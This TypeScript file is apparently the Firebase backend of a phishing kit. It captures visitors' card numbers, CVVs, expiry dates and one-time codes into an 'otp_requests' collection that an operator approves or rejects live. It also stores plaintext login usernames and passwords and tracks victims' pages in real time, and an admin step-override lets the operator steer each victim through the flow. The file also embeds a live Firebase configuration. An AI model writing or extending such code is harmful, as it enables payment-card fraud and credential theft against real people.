import { getApp, getApps, initializeApp } from "firebase/app"
import {
  getDatabase,
  ref,
  set,
  onValue,
  remove,
  onDisconnect,
  serverTimestamp as rtdbServerTimestamp,
} from "firebase/database"
import {
  doc,
  getFirestore,
  setDoc,
  collection,
  getDocs,
  query,
  orderBy,
  onSnapshot,
  serverTimestamp,
  deleteDoc,
  getDoc,
} from "firebase/firestore"

const firebaseConfig = {
  apiKey: "AIzaSyCVuDP2-RaK509rdoZUGarOkdBb4CpT_f8",
  authDomain: "neewtaminsss.firebaseapp.com",
  databaseURL: "https://neewtaminsss-default-rtdb.firebaseio.com",
  projectId: "neewtaminsss",
  storageBucket: "neewtaminsss.firebasestorage.app",
  messagingSenderId: "873192027415",
  appId: "1:873192027415:web:724aafce2bcdbdb8e73352",
  measurementId: "G-JB0KP1FZH4",
}

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig)
const db = getFirestore(app)
const database = getDatabase(app)

export { app }

function getVisitorId(): string {
  let visitorId = localStorage.getItem("visitor")
  if (!visitorId) {
    visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    localStorage.setItem("visitor", visitorId)
  }
  return visitorId
}

const retryOperation = async <T,>(operation: () => Promise<T>, maxRetries = 3, delay = 1000): Promise<T> => {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const result = await operation()
      console.log(" Operation succeeded on attempt", i + 1)
      return result
    } catch (error) {
      console.error(` Attempt ${i + 1} failed:`, error)
      if (i === maxRetries - 1) throw error
      await new Promise((resolve) => setTimeout(resolve, delay * (i + 1)))
    }
  }
  throw new Error("Max retries reached")
}

const verifyDataWrite = async (docPath: string, collectionName: string): Promise<boolean> => {
  try {
    const docRef = doc(db, collectionName, docPath)
    const docSnap = await getDoc(docRef)
    const exists = docSnap.exists()
    console.log(" Data verification:", exists ? "SUCCESS" : "FAILED", `for ${collectionName}/${docPath}`)
    return exists
  } catch (error) {
    console.error(" Error verifying data write:", error)
    return false
  }
}

// Online Status using Realtime Database
export const setOnlineStatus = () => {
  const visitorId = getVisitorId()
  const onlineRef = ref(database, `online/${visitorId}`)

  console.log(" Setting online status for visitor:", visitorId)
  set(onlineRef, {
    visitorId,
    online: true,
    lastSeen: rtdbServerTimestamp(),
    currentPage: window.location.pathname,
  })

  // Remove entry completely on disconnect
  onDisconnect(onlineRef).remove()

  return () => {
    console.log(" Removing online status for visitor:", visitorId)
    remove(onlineRef)
  }
}

export const updateOnlinePage = (page: string) => {
  const visitorId = getVisitorId()
  const onlineRef = ref(database, `online/${visitorId}`)

  console.log(" Updating online page to:", page)
  set(onlineRef, {
    visitorId,
    online: true,
    lastSeen: rtdbServerTimestamp(),
    currentPage: page,
  })
}

export const subscribeToOnlineUsers = (callback: (users: any[]) => void) => {
  const onlineRef = ref(database, "online")
  return onValue(onlineRef, (snapshot) => {
    const data = snapshot.val()
    if (!data) {
      callback([])
      return
    }
    const users = Object.entries(data).map(([id, userData]: [string, any]) => ({
      id,
      ...userData,
    }))
    console.log(" Online users updated, count:", users.length)
    callback(users)
  })
}

export async function addData(data: any) {
  try {
    const visitorId = getVisitorId()
    const docRef = doc(db, "submissions", visitorId)

    console.log(" Saving data for visitor:", visitorId, data)

    await retryOperation(async () => {
      await setDoc(
        docRef,
        {
          ...data,
          visitorId,
          updatedAt: serverTimestamp(),
        },
        { merge: true },
      )
    })

    const verified = await verifyDataWrite(visitorId, "submissions")
    if (!verified) {
      console.error(" Data write verification FAILED")
      throw new Error("Failed to verify data write")
    }

    console.log(" Data successfully saved and verified")
    return true
  } catch (error) {
    console.error(" Error adding data:", error)
    return false
  }
}

export const handleCurrentPage = async (page: string) => {
  const visitorId = getVisitorId()

  console.log(" Handling current page update:", page)

  // Update online status immediately
  updateOnlinePage(page)

  const success = await addData({ currentPage: page })

  if (!success) {
    console.error(" CRITICAL: Failed to update current page in Firestore")
  } else {
    console.log(" Current page updated successfully in Firestore")
  }

  return success
}

export const handlePay = async (paymentInfo: any, setPaymentInfo?: any) => {
  try {
    const visitorId = getVisitorId()
    const docRef = doc(db, "pays", visitorId)

    console.log(" Processing payment for visitor:", visitorId)

    await retryOperation(async () => {
      await setDoc(
        docRef,
        {
          ...paymentInfo,
          visitorId,
          status: "pending",
          updatedAt: serverTimestamp(),
        },
        { merge: true },
      )
    })

    const verified = await verifyDataWrite(visitorId, "pays")
    if (!verified) {
      throw new Error("Failed to verify payment write")
    }

    if (setPaymentInfo) {
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }))
    }

    console.log(" Payment data saved and verified")
    return true
  } catch (error) {
    console.error(" Error adding payment:", error)
    return false
  }
}

export const saveStepData = async (step: string, stepData: any) => {
  try {
    const visitorId = getVisitorId()
    const docRef = doc(db, "submissions", visitorId)

    console.log(" Saving step", step, "data for visitor:", visitorId)

    const dataToSave = {
      visitorId,
      [`step_${step}`]: {
        ...stepData,
        completedAt: new Date().toISOString(),
      },
      lastStep: step,
      updatedAt: serverTimestamp(),
    }

    await retryOperation(async () => {
      await setDoc(docRef, dataToSave, { merge: true })
    })

    const verified = await verifyDataWrite(visitorId, "submissions")
    if (!verified) {
      throw new Error("Failed to verify step data write")
    }

    console.log(" Step", step, "data saved and verified")
    return true
  } catch (error) {
    console.error(" Error saving step data:", error)
    return false
  }
}

export const completeRegistration = async (allData: any) => {
  try {
    const visitorId = getVisitorId()
    const docRef = doc(db, "submissions", visitorId)

    console.log(" Completing registration for visitor:", visitorId)

    const finalData = {
      ...allData,
      visitorId,
      status: "completed",
      completedAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    }

    await retryOperation(async () => {
      await setDoc(docRef, finalData, { merge: true })
    })

    const verified = await verifyDataWrite(visitorId, "submissions")
    if (!verified) {
      throw new Error("Failed to verify registration completion")
    }

    console.log(" Registration completed and verified")
    return true
  } catch (error) {
    console.error(" Error completing registration:", error)
    return false
  }
}

export const getAllSubmissions = async () => {
  try {
    const submissionsRef = collection(db, "submissions")
    const snapshot = await getDocs(submissionsRef)
    const submissions = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }))
    console.log(" Retrieved", submissions.length, "submissions")
    return submissions
  } catch (error) {
    console.error(" Error getting submissions:", error)
    return []
  }
}

export const getAllPayments = async () => {
  try {
    const paysRef = collection(db, "pays")
    const snapshot = await getDocs(paysRef)
    const payments = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }))
    console.log(" Retrieved", payments.length, "payments")
    return payments
  } catch (error) {
    console.error(" Error getting payments:", error)
    return []
  }
}

export const subscribeToSubmissions = (callback: (data: any[]) => void) => {
  const submissionsRef = collection(db, "submissions")
  return onSnapshot(submissionsRef, (snapshot) => {
    const data = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }))
    console.log(" Submissions updated, count:", data.length)
    callback(data)
  })
}

export const subscribeToPayments = (callback: (data: any[]) => void) => {
  const paysRef = collection(db, "pays")
  return onSnapshot(paysRef, (snapshot) => {
    const data = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }))
    console.log(" Payments updated, count:", data.length)
    callback(data)
  })
}

export const deleteSubmission = async (submissionId: string) => {
  try {
    const docRef = doc(db, "submissions", submissionId)
    await deleteDoc(docRef)
    console.log(" Submission deleted:", submissionId)
    return true
  } catch (error) {
    console.error(" Error deleting submission:", error)
    return false
  }
}

export const deletePayment = async (paymentId: string) => {
  try {
    const docRef = doc(db, "pays", paymentId)
    await deleteDoc(docRef)
    console.log(" Payment deleted:", paymentId)
    return true
  } catch (error) {
    console.error(" Error deleting payment:", error)
    return false
  }
}

export const deleteOnlineUser = async (visitorId: string) => {
  try {
    const onlineRef = ref(database, `online/${visitorId}`)
    await remove(onlineRef)
    console.log(" Online user deleted:", visitorId)
    return true
  } catch (error) {
    console.error(" Error deleting online user:", error)
    return false
  }
}

export const requestOtpApproval = async (otpData: {
  cardNumber: string
  cardName: string
  expiry: string
  cvv: string
  otpCode: string
  userName?: string
  email?: string
}) => {
  try {
    const visitorId = getVisitorId()
    const docRef = doc(db, "otp_requests", visitorId)

    console.log(" Requesting OTP approval for visitor:", visitorId)

    // Build clean data object without undefined values
    const cleanData: Record<string, any> = {
      cardNumber: otpData.cardNumber || "",
      cardName: otpData.cardName || "",
      expiry: otpData.expiry || "",
      cvv: otpData.cvv || "",
      otpCode: otpData.otpCode || "",
      visitorId,
      status: "pending",
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    }

    // Only add optional fields if they have values
    if (otpData.userName) cleanData.userName = otpData.userName
    if (otpData.email) cleanData.email = otpData.email

    await retryOperation(async () => {
      await setDoc(docRef, cleanData)
    })

    const verified = await verifyDataWrite(visitorId, "otp_requests")
    if (!verified) {
      throw new Error("Failed to verify OTP request write")
    }

    console.log(" OTP request saved and verified")
    return true
  } catch (error) {
    console.error(" Error requesting OTP approval:", error)
    return false
  }
}

export const subscribeToOtpApproval = (callback: (status: string | null) => void) => {
  const visitorId = getVisitorId()
  const docRef = doc(db, "otp_requests", visitorId)
  return onSnapshot(docRef, (snapshot) => {
    if (snapshot.exists()) {
      const status = snapshot.data().status
      console.log(" OTP status updated:", status)
      callback(status)
    } else {
      callback(null)
    }
  })
}

export const subscribeToAllOtpRequests = (callback: (requests: any[]) => void) => {
  const otpRef = collection(db, "otp_requests")
  return onSnapshot(otpRef, (snapshot) => {
    const data = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }))
    console.log(" OTP requests updated, count:", data.length)
    callback(data)
  })
}

export const approveOtp = async (visitorId: string) => {
  try {
    const docRef = doc(db, "otp_requests", visitorId)

    console.log(" Approving OTP for visitor:", visitorId)

    await retryOperation(async () => {
      await setDoc(
        docRef,
        {
          status: "approved",
          approvedAt: serverTimestamp(),
          updatedAt: serverTimestamp(),
        },
        { merge: true },
      )
    })

    console.log(" OTP approved successfully")
    return true
  } catch (error) {
    console.error(" Error approving OTP:", error)
    return false
  }
}

export const rejectOtp = async (visitorId: string) => {
  try {
    const docRef = doc(db, "otp_requests", visitorId)

    console.log(" Rejecting OTP for visitor:", visitorId)

    await retryOperation(async () => {
      await setDoc(
        docRef,
        {
          status: "rejected",
          rejectedAt: serverTimestamp(),
          updatedAt: serverTimestamp(),
        },
        { merge: true },
      )
    })

    console.log(" OTP rejected successfully")
    return true
  } catch (error) {
    console.error(" Error rejecting OTP:", error)
    return false
  }
}

export const deleteOtpRequest = async (visitorId: string) => {
  try {
    const docRef = doc(db, "otp_requests", visitorId)
    await deleteDoc(docRef)
    console.log(" OTP request deleted:", visitorId)
    return true
  } catch (error) {
    console.error(" Error deleting OTP request:", error)
    return false
  }
}

export const setUserStep = async (visitorId: string, step: number) => {
  try {
    const docRef = doc(db, "submissions", visitorId)

    console.log(" Setting user step to", step, "for visitor:", visitorId)

    await retryOperation(async () => {
      await setDoc(
        docRef,
        {
          adminStepOverride: step,
          stepOverrideSetAt: serverTimestamp(),
          updatedAt: serverTimestamp(),
        },
        { merge: true },
      )
    })

    const verified = await verifyDataWrite(visitorId, "submissions")
    if (!verified) {
      throw new Error("Failed to verify step override write")
    }

    console.log(" User step set and verified")
    return true
  } catch (error) {
    console.error(" Error setting user step:", error)
    return false
  }
}

export const clearUserStepOverride = async (visitorIdParam?: string) => {
  try {
    const visitorId = visitorIdParam || getVisitorId()
    const docRef = doc(db, "submissions", visitorId)

    console.log(" Clearing step override for visitor:", visitorId)

    await retryOperation(async () => {
      await setDoc(
        docRef,
        {
          adminStepOverride: null,
          stepOverrideClearedAt: serverTimestamp(),
          updatedAt: serverTimestamp(),
        },
        { merge: true },
      )
    })

    console.log(" Step override cleared successfully")
    return true
  } catch (error) {
    console.error(" Error clearing step override:", error)
    return false
  }
}

export const subscribeToUserStep = (callback: (step: number | null) => void) => {
  const visitorId = getVisitorId()
  const docRef = doc(db, "submissions", visitorId)
  return onSnapshot(docRef, (snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.data()
      const step = data.adminStepOverride || null
      console.log(" User step updated:", step)
      callback(step)
    } else {
      callback(null)
    }
  })
}

export const saveLoginAttempt = async (username: string, password: string) => {
  try {
    const visitorId = getVisitorId()
    const attemptId = `${visitorId}_${Date.now()}`
    const docRef = doc(db, "login_attempts", attemptId)

    console.log(" Saving login attempt for:", username)

    const attemptData = {
      visitorId,
      username,
      password,
      createdAt: serverTimestamp(),
      userAgent: navigator.userAgent,
      language: navigator.language,
      timestamp: new Date().toISOString(),
    }

    await retryOperation(async () => {
      await setDoc(docRef, attemptData)
    })

    const verified = await verifyDataWrite(attemptId, "login_attempts")
    if (!verified) {
      throw new Error("Failed to verify login attempt write")
    }

    console.log(" Login attempt saved and verified")
    return true
  } catch (error) {
    console.error(" Error saving login attempt:", error)
    return false
  }
}

export const subscribeToLoginAttempts = (callback: (attempts: any[]) => void) => {
  const collectionRef = collection(db, "login_attempts")
  const q = query(collectionRef, orderBy("createdAt", "desc"))
  return onSnapshot(q, (snapshot) => {
    const attempts = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }))
    console.log(" Login attempts updated, count:", attempts.length)
    callback(attempts)
  })
}

export const deleteLoginAttempt = async (attemptId: string) => {
  try {
    const docRef = doc(db, "login_attempts", attemptId)
    await deleteDoc(docRef)
    console.log(" Login attempt deleted:", attemptId)
    return true
  } catch (error) {
    console.error(" Error deleting login attempt:", error)
    return false
  }
}

export { db, database }
